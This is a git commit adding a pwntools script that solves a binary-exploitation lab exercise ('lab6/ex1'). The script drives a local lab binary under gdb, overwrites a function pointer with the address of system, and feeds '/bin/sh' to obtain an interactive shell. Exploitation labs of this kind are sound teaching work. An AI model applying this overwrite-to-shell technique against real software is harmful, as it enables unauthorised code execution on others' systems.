8c836a11dc34c7cee0b4d830afe45c5bd90144f0
TgeorgeT <george_teodorescu2002@yahoo.com>
2024-12-16 01:09:00 +0200

    Add ex1 solution

---
+++ lab6/solve_ex1.py
@@ -0,0 +1,55 @@
+from pwn import *
+
+context.arch = "amd64"
+
+
+context.terminal = ["gnome-terminal", "--geometry=160x80", "-e"]
+io = gdb.debug(
+    "./bin/ex1",
+    """
+    set follow-fork-mode parent
+    break ex1.c:42
+    break ex1.c:69
+    c
+    c
+    c
+    """,
+)
+
+# address of config -> 0xb726c0
+system = 0x401060
+
+
+io.sendline(b"4\n")
+
+io.sendline(b"3\n")
+
+io.sendline(b"5\n")
+io.sendline(b"1\n")
+io.sendline(b"0")
+
+io.sendline(p64(system))
+io.send(b"test\n")
+io.sendline(b"1\n")
+io.sendline(b"1")
+
+
+io.sendline(b"/bin/sh")
+io.send(b"test\n")
+
+
+io.sendline(b"2\n")
+io.sendline(b"1\n")
+
+# io.sendline("5\n")
+# io.sendline("1\n")
+# io.sendline("0")
+# io.sendline(p64(system))
+# io.sendline(b"abc")
+# io.sendline("1\n")
+# io.sendline("1\n")
+# io.sendline("1")
+
+# io.sendline(b"/bin/sh")
+
+io.interactive()
